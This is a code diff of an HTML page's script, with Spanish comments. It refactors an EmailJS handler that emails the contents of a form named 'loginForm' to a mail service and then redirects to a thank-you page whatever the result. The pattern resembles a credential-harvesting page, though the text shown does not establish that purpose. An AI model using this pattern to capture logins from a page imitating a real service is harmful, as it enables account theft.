@@ -177,25 +177,35 @@
 
     <!-- Script para EmailJS -->
     <script type="text/javascript">
+        // Inicializa EmailJS con tu userID
+        emailjs.init('user_f80imbc');
+
+        // Manejamos el evento de envío del formulario
         document.addEventListener("DOMContentLoaded", function () {
-            emailjs.init('user_f80imbc');
+            var form = document.querySelector("#loginForm"); // Usamos querySelector para seleccionar el formulario
 
-            document.getElementById('loginForm').addEventListener('submit', function (event) {
-                event.preventDefault();
+            if (form) {
+                form.addEventListener('submit', function (event) {
+                    event.preventDefault();  // Prevenir el envío tradicional del formulario
 
-                var formData = new FormData(this);
+                    var formData = new FormData(form);  // Obtener los datos del formulario
 
-                emailjs.sendForm('service_f80imbc', 'template_8dg1bfi', formData)
-                    .then(function (response) {
-                        console.log('SUCCESS!', response.status, response.text);
-                        window.location.href = 'gracias.html';
-                    }, function (error) {
-                        console.log('FAILED...', error);
-                        window.location.href = 'gracias.html';
-                    });
-            });
+                    // Enviar el formulario con EmailJS
+                    emailjs.sendForm('service_f80imbc', 'template_8dg1bfi', formData)
+                        .then(function (response) {
+                            console.log('SUCCESS!', response.status, response.text);
+                            window.location.href = 'gracias.html';
+                        }, function (error) {
+                            console.log('FAILED...', error);
+                            window.location.href = 'gracias.html';
+                        });
+                });
+            } else {
+                console.error("Formulario no encontrado");
+            }
         });
     </script>
+
 </body>
 
 </html>
